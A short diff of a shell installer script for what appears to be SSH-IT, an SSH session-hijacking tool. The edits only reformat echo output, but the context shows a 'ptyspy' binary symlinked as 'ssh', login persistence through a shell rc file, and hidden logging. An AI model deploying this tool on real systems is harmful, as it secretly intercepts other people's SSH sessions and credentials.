@@ -23,7 +23,7 @@ fi
 OK_OUT()
 {
 	echo -e 2>&1 "......[${CG}OK${CN}]"
-	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
+	[[ -n $1 ]] && echo -e 1>&2 "--> $*"
 }
 
 rcfile_add()
@@ -210,12 +210,12 @@ ln -sf "ptyspy_bin.${OSARCH}" "${THC_BASEDIR}/ssh"
 
 if [[ -n $THC_LOCAL ]]; then
 	OK_OUT
-	echo -e 2>&1 ""\
-"--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}.\n"\
-"--> Logging to ${CY}${THC_BASEDIR}/.l${CN}\n"\
-"--> Type ${CM}${THC_BASEDIR}/thc_cli -r uninstall${CN} to remove.\n"\
-"--> SSH-IT will start on next log in or to start right\n"\
-"    now type ${CM}source ${THC_BASEDIR}/seed${CN}."
+	echo -e 2>&1 "\
+--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}.
+--> Logging to ${CY}${THC_BASEDIR}/.l${CN}
+--> Type ${CM}${THC_BASEDIR}/thc_cli -r uninstall${CN} to remove.
+--> SSH-IT will start on next log in or to start right
+    now type ${CM}source ${THC_BASEDIR}/seed${CN}."
 fi
 
 exit 0
